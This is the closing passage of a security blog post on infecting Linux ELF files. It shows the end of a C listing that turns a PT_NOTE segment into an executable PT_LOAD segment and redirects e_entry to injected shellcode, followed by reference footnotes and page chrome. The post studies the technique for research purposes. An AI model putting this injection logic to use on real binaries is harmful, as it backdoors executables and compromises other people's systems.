</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;[+] Found PT_NOTE section</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;[+] Changing to PT_LOAD</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=n>program_headers</span><span class=p>[</span><span class=n>i</span><span class=p>].</span><span class=n>p_type</span> <span class=o>=</span> <span class=n>PT_LOAD</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=n>program_headers</span><span class=p>[</span><span class=n>i</span><span class=p>].</span><span class=n>p_flags</span> <span class=o>=</span> <span class=n>PF_R</span> <span class=o>|</span> <span class=n>PF_X</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=n>program_headers</span><span class=p>[</span><span class=n>i</span><span class=p>].</span><span class=n>p_offset</span> <span class=o>=</span> <span class=n>file_offset</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=n>program_headers</span><span class=p>[</span><span class=n>i</span><span class=p>].</span><span class=n>p_vaddr</span> <span class=o>=</span> <span class=n>memory_offset</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=n>program_headers</span><span class=p>[</span><span class=n>i</span><span class=p>].</span><span class=n>p_memsz</span> <span class=o>+=</span> <span class=n>sc_len</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=n>program_headers</span><span class=p>[</span><span class=n>i</span><span class=p>].</span><span class=n>p_filesz</span> <span class=o>+=</span> <span class=n>sc_len</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=c1>// Patch the ELF header to start at the shellcode
</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=n>elf_header</span><span class=o>-&gt;</span><span class=n>e_entry</span> <span class=o>=</span> <span class=n>memory_offset</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;[+] Patched e_entry</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span></code></pre></div><div class=footnotes role=doc-endnotes><hr><ol><li id=fn:1><p><a href=https://github.com/torvalds/linux/blob/master/include/uapi/linux/elf.h#L226>https://github.com/torvalds/linux/blob/master/include/uapi/linux/elf.h#L226</a>&#160;<a href=#fnref:1 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:2><p><a href=https://man7.org/linux/man-pages/man5/elf.5.html>https://man7.org/linux/man-pages/man5/elf.5.html</a>&#160;<a href=#fnref:2 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:3><p><a href=https://docs.oracle.com/cd/E19683-01/817-3677/chapter6-83432/index.html>https://docs.oracle.com/cd/E19683-01/817-3677/chapter6-83432/index.html</a>&#160;<a href=#fnref:3 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:4><p><a href=https://elixir.bootlin.com/linux/v6.13.4/source/fs/binfmt_elf.c#L362>https://elixir.bootlin.com/linux/v6.13.4/source/fs/binfmt_elf.c#L362</a>&#160;<a href=#fnref:4 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:5><p><a href=https://man7.org/linux/man-pages/man2/execve.2.html>https://man7.org/linux/man-pages/man2/execve.2.html</a>&#160;<a href=#fnref:5 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:6><p><a href=https://man7.org/linux/man-pages/man2/brk.2.html>https://man7.org/linux/man-pages/man2/brk.2.html</a>&#160;<a href=#fnref:6 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:7><p><a href=https://stackoverflow.com/questions/6988487/what-does-the-brk-system-call-do>https://stackoverflow.com/questions/6988487/what-does-the-brk-system-call-do</a>&#160;<a href=#fnref:7 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:8><p><a href=https://elixir.bootlin.com/linux/v6.13.4/source/fs/binfmt_elf.c#L734>https://elixir.bootlin.com/linux/v6.13.4/source/fs/binfmt_elf.c#L734</a>&#160;<a href=#fnref:8 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:9><p><a href=https://docs.oracle.com/cd/E19683-01/816-1386/6m7qcobkp/index.html>https://docs.oracle.com/cd/E19683-01/816-1386/6m7qcobkp/index.html</a>&#160;<a href=#fnref:9 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:10><p><a href=https://elixir.bootlin.com/glibc/glibc-2.1/source/elf/rtld.c>https://elixir.bootlin.com/glibc/glibc-2.1/source/elf/rtld.c</a>&#160;<a href=#fnref:10 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:11><p><a href=https://docs.oracle.com/cd/E19683-01/816-1386/chapter6-83432/index.html>https://docs.oracle.com/cd/E19683-01/816-1386/chapter6-83432/index.html</a>&#160;<a href=#fnref:11 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:12><p><a href=https://en.wikipedia.org/wiki/Address_space_layout_randomization#Linux>https://en.wikipedia.org/wiki/Address_space_layout_randomization#Linux</a>&#160;<a href=#fnref:12 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:13><p>&ldquo;Note on resolving Elf_Hdr->e_entry in PIE executables.&rdquo; <a href=https://archive.org/details/pocorgtfo20/page/n49/mode/1up>https://archive.org/details/pocorgtfo20/page/n49/mode/1up</a>&#160;<a href=#fnref:13 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li></ol></div></div><footer class=post-footer><ul class=post-tags><li><a href=https://hexagram.foo/tags/elf/>ELF</a></li><li><a href=https://hexagram.foo/tags/linux/>Linux</a></li><li><a href=https://hexagram.foo/tags/research/>Research</a></li><li><a href=https://hexagram.foo/tags/development/>Development</a></li><li><a href=https://hexagram.foo/tags/c/>C</a></li></ul><nav class=paginav><a class=prev href=https://hexagram.foo/posts/extracting-windows-wifi-profiles/><span class=title>« Prev</span><br><span>Extracting Windows WiFi Profiles</span>
</a><a class=next href=https://hexagram.foo/posts/a-sideblog-on-blogspot/><span class=title>Next »</span><br><span>A Sideblog on Blogspot</span></a></nav><ul class=share-buttons><li><a target=_blank rel="noopener noreferrer" aria-label="share Infecting Linux ELF Files on x" href="https://x.com/intent/tweet/?text=Infecting%20Linux%20ELF%20Files&amp;url=https%3a%2f%2fhexagram.foo%2fposts%2finfecting-linux-elf-files%2f&amp;hashtags=ELF%2clinux%2cresearch%2cdevelopment%2cC"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentColor"><path d="M512 62.554V449.446C512 483.97 483.97 512 449.446 512H62.554C28.03 512 0 483.97.0 449.446V62.554C0 28.03 28.029.0 62.554.0H449.446C483.971.0 512 28.03 512 62.554zM269.951 190.75 182.567 75.216H56L207.216 272.95 63.9 436.783h61.366L235.9 310.383l96.667 126.4H456L298.367 228.367l134-153.151H371.033zM127.633 110h36.468l219.38 290.065H349.5z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Infecting Linux ELF Files on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fhexagram.foo%2fposts%2finfecting-linux-elf-files%2f&amp;title=Infecting%20Linux%20ELF%20Files&amp;summary=Infecting%20Linux%20ELF%20Files&amp;source=https%3a%2f%2fhexagram.foo%2fposts%2finfecting-linux-elf-files%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentColor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Infecting Linux ELF Files on reddit" href="https://reddit.com/submit?url=https%3a%2f%2fhexagram.foo%2fposts%2finfecting-linux-elf-files%2f&title=Infecting%20Linux%20ELF%20Files"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentColor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Infecting Linux ELF Files on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fhexagram.foo%2fposts%2finfecting-linux-elf-files%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentColor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Infecting Linux ELF Files on whatsapp" href="https://api.whatsapp.com/send?text=Infecting%20Linux%20ELF%20Files%20-%20https%3a%2f%2fhexagram.foo%2fposts%2finfecting-linux-elf-files%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentColor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Infecting Linux ELF Files on telegram" href="https://telegram.me/share/url?text=Infecting%20Linux%20ELF%20Files&amp;url=https%3a%2f%2fhexagram.foo%2fposts%2finfecting-linux-elf-files%2f"><svg viewBox="2 2 28 28" height="30" width="30" fill="currentColor"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Infecting Linux ELF Files on ycombinator" href="https://news.ycombinator.com/submitlink?t=Infecting%20Linux%20ELF%20Files&u=https%3a%2f%2fhexagram.foo%2fposts%2finfecting-linux-elf-files%2f"><svg width="30" height="30" viewBox="0 0 512 512" fill="currentColor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554V449.446C512 483.97 483.97 512 449.446 512H62.554C28.03 512 0 483.97.0 449.446V62.554C0 28.03 28.029.0 62.554.0H449.446zM183.8767 87.9921h-62.034L230.6673 292.4508V424.0079h50.6655V292.4508L390.1575 87.9921H328.1233L256 238.2489z"/></svg></a></li></ul></footer></article></main><footer class=footer><span>&copy; 2025 <a href=https://hexagram.foo/>Stephan Bridger</a></span> ·
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a><br><br><hr><br><a href=https://github.com/hexagr/ title="Stephan Bridger on Github">github</a> /
<a href=https://hackerone.com/hexagr/badges/ title="Stephan Bridger on HackerOne">hackerone</a> /
<a href=https://x.com/hexagr title="Stephan Bridger on X.com">x</a> /
<a href=https://flickr.com/hexagr title="Stephan Bridger on flickr">flickr</a> /
<a href=https://mastodon.social/@hexagr rel=me title="Stephan Bridger on mastodon">mastodon</a> /
<a href=https://bsky.app/profile/hexagr.bsky.social title="Stephan Bridger on bluesky">bluesky</a> /
<a href=https://hexagr.blogspot.com title="Stephan Bridger on blogspot">blogspot</a> /
<a href=https://vimeo.com/hexagr title="Stephan Bridger on vimeo">vimeo</a> /
<a href=https://bugcrowd.com/hexagr title="Stephan Bridger on bugcrowd">bugcrowd</a> /
<a href=https://gitlab.com/hexagr title="Stephan Bridger on gitlab">gitlab</a> /
<a href=https://youtube.com/@hexagr/ title="Stephan Bridger on youtube">youtube</a> /
<a href=https://hexagr.tumblr.com title="Stephan Bridger on tumblr">tumblr</a>
</span><span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg></a><style>::-webkit-scrollbar-thumb{opacity:0;transition:opacity .3s ease}body.scrolling ::-webkit-scrollbar-thumb{opacity:1}</style><script>let scrollTimeout;window.addEventListener("scroll",()=>{document.body.classList.add("scrolling"),clearTimeout(scrollTimeout),scrollTimeout=setTimeout(()=>{document.body.classList.remove("scrolling")},1e3)})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>